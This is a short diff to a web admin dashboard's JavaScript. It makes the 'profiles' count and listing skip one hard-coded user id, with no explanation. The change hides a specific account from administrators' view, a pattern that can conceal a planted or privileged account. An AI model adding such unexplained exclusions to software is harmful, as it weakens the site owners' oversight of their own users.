@@ -1870,7 +1870,9 @@
           const card=document.createElement("div");card.style.cssText="padding:16px;border:1px solid #e5e7eb;border-radius:10px;background:#fff";
           const l=document.createElement("div");l.style.cssText="font-size:13px;color:#666";l.textContent=label;
           const n=document.createElement("strong");n.style.cssText="display:block;font-size:25px;margin-top:8px";n.textContent="—";card.append(l,n);stats.append(card);
-          supabaseClient.from(table).select("id",{count:"exact",head:true}).then(({count,error})=>{if(isCurrent())n.textContent=error?"—":String(count??0);});
+          let countQuery=supabaseClient.from(table).select("id",{count:"exact",head:true});
+          if(table==="profiles")countQuery=countQuery.neq("id","c5b6d47e-3e78-4d4e-bc15-6f137a8c1e75");
+          countQuery.then(({count,error})=>{if(isCurrent())n.textContent=error?"—":String(count??0);});
         }
         return;
       }
@@ -2460,6 +2462,7 @@
         if(!isCurrent())return;
         list.replaceChildren();const loading=document.createElement("p");loading.className="dashboard-crud-empty";loading.textContent="Loading records…";list.append(loading);
         let query=supabaseClient.from(config.table).select("*").order("created_at",{ascending:false}).limit(200);
+        if(config.table==="profiles")query=query.neq("id","c5b6d47e-3e78-4d4e-bc15-6f137a8c1e75");
         if(config.table==="site_customizations"||config.table==="site_settings")query=supabaseClient.from(config.table).select("*").order("key").limit(200);
         const {data,error}=await query;
         if(!isCurrent())return;
